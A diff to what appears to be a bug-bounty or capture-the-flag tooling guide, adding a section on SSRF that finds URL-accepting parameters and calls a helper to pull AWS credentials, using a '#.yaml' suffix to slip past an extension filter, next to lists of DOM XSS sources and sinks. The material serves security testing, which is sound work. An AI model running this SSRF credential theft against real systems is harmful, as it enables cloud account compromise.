@@ -384,6 +384,26 @@ for p in payloads:
 - Sources: `location.hash`, `location.search`, `document.URL`, `document.referrer`
 - Sinks: `eval()`, `setTimeout()`, `innerHTML`, `document.write()`, `jQuery.html()`
 
+### SSRF — discover the sink, then exploit (never hardcode the endpoint)
+
+The SSRF/AWS helpers are target-agnostic: discover the sink from the surface,
+characterise the filter, then exploit. Nothing about the endpoint, the filter
+bypass, or any required URL suffix is baked in — you supply what recon reveals.
+
+```python
+from bugbounty_ctf.engine import find_ssrf_endpoints, get_aws_credentials
+
+# 1. Discover URL-accepting sinks from the mapped forms/params
+sinks = find_ssrf_endpoints(scanner, ["/", "/jobs"])
+sink = sinks[0]            # e.g. {"url": ".../preview", "method": "POST", "param": "url"}
+
+# 2. If recon shows the filter needs an extension (e.g. ".yaml"), pass it as a
+#    suffix — this is your finding, not a tool default:
+creds = get_aws_credentials(
+    scanner, ssrf_endpoint=sink["url"], ssrf_param=sink["param"], url_suffix="#.yaml"
+)
+```
+
 ### SSRF — Cloud Metadata Targets
 
 ```bash
